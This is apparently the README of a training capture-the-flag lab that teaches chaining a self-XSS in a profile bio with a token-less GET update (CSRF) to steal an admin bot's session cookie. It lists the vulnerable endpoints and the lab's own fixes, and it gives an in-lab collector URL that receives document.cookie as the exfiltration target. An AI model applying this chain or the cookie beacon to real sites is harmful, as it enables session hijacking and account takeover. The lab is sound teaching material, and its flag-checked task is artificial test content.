# Self-XSS Chained via CSRF

> Track: `xss` · Difficulty: **practitioner** · ~40 min · Free hints.

## Scenario

**Profilr** lets each user write a bio. The bio is **HTML-escaped** when anyone
else views your profile (`GET /u/<name>`), but rendered **raw** when _you_ view
your own (`GET /profile`). That is the classic **self-XSS shrug**: sure, you can
inject `<img onerror>` into your own bio, but it only ever runs in _your_ session —
so who cares?

Two details make it matter:

1. The bio is updated via **`GET /profile/update?bio=...`** — a state change over
   GET, session-gated but with **no CSRF token** ("it's only self-XSS anyway").
2. So another site can change _your_ bio for you. And because the update is a
   **top-level GET navigation**, the browser sends your `SameSite=Lax` session
   cookie along with it — the update runs as you.

The admin bot visits any URL you queue via `POST /report {"url":"..."}` while
carrying its **non-HttpOnly** `session` cookie.

## Objective

Plant a self-XSS payload in the **admin's** bio by CSRF, so that when the admin's
own `/profile` renders it raw, it runs in the admin's session and steals the
cookie. Beacon it to the in-lab collector:

```
http://collector:9000/report?c=<document.cookie>
```

Read it back via `GET /oob/received`, then:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when it matches the admin session.

You have an attacker origin to work with: `http://attacker:8080/go?to=<url>`
top-level-redirects whoever visits it to `<url>`.

## Getting Started

1. Confirm the self-XSS is self-only: you cannot load the admin's `/profile`
   (403 — it's the owner's own page), and `/u/admin` **escapes** the bio. So you
   can't just view a payload into existence — the admin has to render it.
2. How does the admin's bio get set? Look at `/profile/update` — what method is it,
   and what's missing that would normally stop another site from calling it?
3. A cross-site **GET navigation** carries a `SameSite=Lax` cookie. Make the admin
   navigate to the update URL with your payload, then to `/profile`. The attacker
   origin's `/go?to=` does the navigating for you.

**CWE-79 (self-XSS) + CWE-352 (CSRF). OWASP A03:2021 – Injection.** The fixes — a
CSRF token / `SameSite=Strict` on the update, and encoding the bio everywhere — are
in `SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Laravel/MySQL profile app CSRF'd via a POST form. This
lab **re-platforms it to Flask** and uses a **GET** state-change: on this HTTP lab
a cross-site **POST** would _not_ carry the `SameSite=Lax` cookie (only top-level
safe-method navigations do), so the sound CSRF vector here is the GET update. The
lesson — self-XSS + a token-less state change = account takeover — is identical.
See `SOLUTION.md` for the deviation note.
